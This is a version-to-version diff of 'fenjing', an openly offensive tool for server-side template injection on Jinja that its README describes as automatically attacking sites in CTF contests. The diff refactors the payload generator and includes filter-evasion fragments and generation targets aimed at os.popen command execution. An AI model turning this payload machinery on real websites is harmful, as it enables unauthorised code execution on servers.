+                    # return None
+                str_result += s
+                used_context.update(c)
+                break
+            else:
+                raise Exception("it shouldn't runs this line")
+        if not self.waf_func(str_result):
             return None
+        return str_result, used_context
 
-    def default_generate(self, gen_type: str, *args):
-
-        if self.cache_has(gen_type, *args):
-            return self.cached_generate(gen_type, *args)
-
-        if gen_type not in req_gens:
-            raise Exception(f"Required type '{gen_type}' not supported.")
+    def common_generate(self, gen_req: ReqGenRequirement) -> ReqGenResult | None:
 
-        # 遍历当前类型每一个payload生成函数
-        for req_gen_func in req_gens[gen_type].copy():
-            son_req = req_gen_func(self.context, *args)
-
-            assert isinstance(
-                son_req, list), f"Wrong son_req {son_req} from {req_gen_func.__name__}"
-            assert all(isinstance(gen_type, str) for gen_type, *
-                       args in son_req), f"Wrong son_req {son_req} from {req_gen_func.__name__}"
+        gen_type: str
+        gen_type, *args = gen_req
+        if gen_type not in req_gens or len(req_gens[gen_type]) == 0:
+            logger.error("Unknown type: %s", gen_type)
+            return None
 
-            payload = self.generate_by_req_list(son_req)
-            if not payload:
+        gens = req_gens[gen_type].copy()
+        gens.sort(key = lambda gen: used_count[gen.__name__], reverse=True)
+        for gen in gens:
+            ret = self.generate_by_list(gen(self.context, *args))
+            if ret is None:
                 continue
-
-            # 生成成功后执行的操作
-            self.count_success(gen_type, req_gen_func.__name__)
-            self.cache_add(gen_type, *args, result=payload)
+            result = ret[0]
             self.callback(CALLBACK_GENERATE_PAYLOAD, {
                 "gen_type": gen_type,
                 "args": args,
-                "payload": payload
+                "payload": result
             })
             # 为了日志的简洁，仅打印一部分日志
-            if gen_type in (INTEGER, STRING) and payload != str(args[0]):
-                logger.info("{great}, {gen_type}({args_repl}) can be {payload}".format(
+            if gen_type in (INTEGER, STRING) and result != str(args[0]):
+                logger.info("{great}, {gen_type}({args_repl}) can be {result}".format(
                     great=colored("green", "Great"),
                     gen_type=colored("yellow", gen_type, bold=True),
                     args_repl=colored("yellow", ", ".join(repr(arg)
-                                      for arg in args)),
-                    payload=colored("blue", payload)
+                                        for arg in args)),
+                    result=colored("blue", result)
                 ))
 
             elif gen_type in (EVAL_FUNC, EVAL, CONFIG, MODULE_OS, OS_POPEN_OBJ, OS_POPEN_READ):
                 logger.info("{great}, we generate {gen_type}({args_repl})".format(
                     great=colored("green", "Great"),
                     gen_type=colored("yellow", gen_type, bold=True),
                     args_repl=colored("yellow", ", ".join(repr(arg)
-                                      for arg in args)),
+                                        for arg in args)),
                 ))
-            return payload
+        
+            if hashable(gen_req):
+                self.cache[gen_req] = ret
+            used_count[gen.__name__] += 1
+            return ret
+        
         logger.warning("{failed} generating {gen_type}({args_repl}), it might not be an issue.".format(
             failed=colored("red", "failed"),
             gen_type=gen_type,
             args_repl=", ".join(repr(arg) for arg in args),
         ))
-        self.cache_add(gen_type, *args, result=None)
         return None
 
-    def generate(self, gen_type, *args):
-        generate_func = self.generate_funcs[gen_type] if gen_type in self.generate_funcs else self.default_generate
-        return generate_func(gen_type, *args)
+
+    def generate(self, gen_type, *args) ->  str | None:
+        result = self.generate_by_list([
+            (gen_type, *args)
+        ])
+        if result is None:
+            return None
+        s, c = result
+        return s
+
+    def generate_with_used_context(self, gen_type, *args) ->  ReqGenResult | None:
+        result = self.generate_by_list([
+            (gen_type, *args)
+        ])
+        if result is None:
+            return None
+        s, c = result
+        return s, c
+
 
 
 def generate(gen_type, *args, waf_func: Callable, context: Union[dict, None] = None) -> Union[str, None]:
     payload_generator = PayloadGenerator(waf_func, context)
     return payload_generator.generate(gen_type, *args)
 
 # ---
@@ -290,14 +318,16 @@
                 (UNSATISFIED, )
             ]
         value_left -= ints[0][1]
         payload_vars.append(ints[0][0])
 
     return [
         (FORMULAR_SUM, tuple(payload_vars))
+    ] + [
+        (WITH_CONTEXT_VAR, v) for v in payload_vars
     ]
 
 # ---
 
 
 @req_gen
 def gen_integer_literal(context: dict, value: int):
@@ -308,16 +338,18 @@
 
 @req_gen
 def gen_integer_context(context: dict, value: int):
     if value not in context.values():
         return [
             (UNSATISFIED, )
         ]
+    v = [k for k, v in context.items() if v == value][0]
     return [
-        (LITERAL, [k for k, v in context.items() if v == value][0])
+        (LITERAL, v),
+        (WITH_CONTEXT_VAR, v),
     ]
 
 
 @req_gen
 def gen_integer_zero(context: dict, value: int):
     if value != 0:
         return [
@@ -390,14 +422,16 @@
             return [
                 (UNSATISFIED, )
             ]
         value_left -= ints[0][1]
         sub_vars.append(ints[0][0])
     return [
         (LITERAL, "({})".format("-".join([to_sub_name, ] + sub_vars)))
+    ] + [
+        (WITH_CONTEXT_VAR, v) for v in [to_sub_name, ] + sub_vars
     ]
 
 
 # ---
 
 @req_gen
 def gen_string_percent_literal1(context):
@@ -415,17 +449,19 @@
 
 @req_gen
 def gen_string_percent_context(context):
     if "%" not in context.values():
         return [
             (UNSATISFIED, )
         ]
-
+    v = [k for k, v in context.items() if v == "%"][0]
     return [
-        (LITERAL, [k for k, v in context.items() if v == "%"][0])
+        (LITERAL, v)
+    ] + [
+        (WITH_CONTEXT_VAR, v)
     ]
 
 
 @req_gen
 def gen_string_percent_urlencode1(context):
     return [
         (LITERAL, "(lipsum()|urlencode|first)")
@@ -613,16 +649,19 @@
         (LITERAL, '"_"')
     ]
 
 
 @req_gen
 def gen_string_underline_context(context: dict):
     if "_" in context.values():
+        v = [k for k, v in context.items() if v == "_"][0]
         return [
-            (LITERAL, [k for k, v in context.items() if v == "_"][0])
+            (LITERAL, v)
+        ] + [
+            (WITH_CONTEXT_VAR, v)
         ]
     return [
         (UNSATISFIED, )
     ]
 
 
 @req_gen
@@ -777,16 +816,19 @@
 
 @req_gen
 def gen_string_context(context: dict, value: str):
     if value not in context.values():
         return [
             (UNSATISFIED, )
         ]
+    v = [k for k, v in context.items() if v == value][0]
     return [
-        (LITERAL, [k for k, v in context.items() if v == value][0])
+        (LITERAL, v)
+    ] + [
+        (WITH_CONTEXT_VAR, v)
     ]
 
 
 @req_gen
 def gen_string_removedunder(context: dict, value: str):
     if not re.match("^__[A_Za-z0-9_]+__$", value):
         return [
@@ -982,14 +1024,16 @@
     format_func = (ATTRIBUTE, (LITERAL, cs), "format")
     req = [
         (LITERAL, "("),
         format_func,
         (LITERAL, "("),
         (LITERAL, ",".join(str(ord(c)) for c in value)),
         (LITERAL, "))")
+    ] + [
+        (WITH_CONTEXT_VAR, k)
     ]
     return req
 
 
 @req_gen
 def gen_string_formatfunc3(context: dict, value: str):
     # (FORMAT(97,98,99))
```

### Comparing `fenjing-0.3.9/fenjing/requester.py` & `fenjing-0.4.0/fenjing/requester.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/fenjing/scan_url.py` & `fenjing-0.4.0/fenjing/scan_url.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/fenjing/shell_payload.py` & `fenjing-0.4.0/fenjing/shell_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/fenjing/templates/index.html` & `fenjing-0.4.0/fenjing/templates/index.html`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/fenjing/waf_func_gen.py` & `fenjing-0.4.0/fenjing/waf_func_gen.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/fenjing/webui.py` & `fenjing-0.4.0/fenjing/webui.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/fenjing.egg-info/PKG-INFO` & `fenjing-0.4.0/README.md`

 * *Files 13% similar despite different names*

```diff
@@ -1,20 +1,7 @@
-Metadata-Version: 2.1
-Name: fenjing
-Version: 0.3.9
-Summary: A Jinja SSTI cracker for CTF competitions
-Home-page: https://github.com/Marven11/Fenjing
-Author: Marven11
-Author-email: marven11@example.com
-Classifier: Programming Language :: Python :: 3.9
-Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
-Classifier: Operating System :: OS Independent
-Description-Content-Type: text/markdown
-License-File: LICENSE
-
 ![焚靖](assets/fenjing.webp)
 
 > Bypass the WAF without knowing WAF
 
 焚靖是一个针对CTF比赛中Jinja SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。
 
 ## 演示
@@ -204,10 +191,9 @@
 
 ```
 
 其他使用例可以看[这里](examples.md)
 
 ## 项目结构
 
-[![](https://mermaid.ink/img/pako:eNp1U01TwyAQ_SsMM-2p-QM5eHA86kU9aTqZLVkaRgKRD2vt9L8LwZQkrRwYeLzdfbyFE2W6QVpSLvWBtWAceb2vFAnD-t3eQN8S74S0JIFxMC21ET-YEYOfHq1DkyGuTTcNUdblbVqhapaVLJpCqJCIA8NpSSneOdiSQxEOO6FARmybGQfc-cjZRQ4XBrn-TuB2loYUxV3CLyLIQkWUbnPQakWakI85oRV5fpyUBF5zr1i9RzW_eM0MsI-pHZaBqr2Rt3lJ1FW6waCFuB6OUkMz0ZfFjZ2LI7hYf4GZ8GyLUtZ_8bPWcLG_xrnP7PkNb4LzNGQ9LzdccJlxAKf79UL15YGMfbv2djyZ-5vmocv_xC3cvyUvWk83tAvvDUQTvsgphlbUtdhhRcuwVOidAVnRSp0DFbzTL0fFaOmMxw31fQMOHwSE1nU0PExpA9qDetM677ERTpun9A2H33j-BR2iIbY?type=png)](https://mermaid.live/edit#pako:eNp1U01TwyAQ_SsMM-2p-QM5eHA86kU9aTqZLVkaRgKRD2vt9L8LwZQkrRwYeLzdfbyFE2W6QVpSLvWBtWAceb2vFAnD-t3eQN8S74S0JIFxMC21ET-YEYOfHq1DkyGuTTcNUdblbVqhapaVLJpCqJCIA8NpSSneOdiSQxEOO6FARmybGQfc-cjZRQ4XBrn-TuB2loYUxV3CLyLIQkWUbnPQakWakI85oRV5fpyUBF5zr1i9RzW_eM0MsI-pHZaBqr2Rt3lJ1FW6waCFuB6OUkMz0ZfFjZ2LI7hYf4GZ8GyLUtZ_8bPWcLG_xrnP7PkNb4LzNGQ9LzdccJlxAKf79UL15YGMfbv2djyZ-5vmocv_xC3cvyUvWk83tAvvDUQTvsgphlbUtdhhRcuwVOidAVnRSp0DFbzTL0fFaOmMxw31fQMOHwSE1nU0PExpA9qDetM677ERTpun9A2H33j-BR2iIbY)
-
+[![](https://mermaid.ink/img/pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg?type=png)](https://mermaid.live/edit#pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg)
```

### Comparing `fenjing-0.3.9/fenjing.egg-info/SOURCES.txt` & `fenjing-0.4.0/fenjing.egg-info/SOURCES.txt`

 * *Files 9% similar despite different names*

```diff
@@ -6,18 +6,18 @@
 setup.py
 fenjing/__init__.py
 fenjing/__main__.py
 fenjing/cli.py
 fenjing/colorize.py
 fenjing/config_payload.py
 fenjing/const.py
+fenjing/context_vars.py
 fenjing/form.py
 fenjing/form_cracker.py
 fenjing/full_payload_gen.py
-fenjing/int_vars.py
 fenjing/payload_gen.py
 fenjing/requester.py
 fenjing/scan_url.py
 fenjing/shell_payload.py
 fenjing/waf_func_gen.py
 fenjing/webui.py
 fenjing.egg-info/PKG-INFO
```

### Comparing `fenjing-0.3.9/setup.py` & `fenjing-0.4.0/setup.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/tests/test_payload_gen.py` & `fenjing-0.4.0/tests/test_payload_gen.py`

 * *Files identical despite different names*

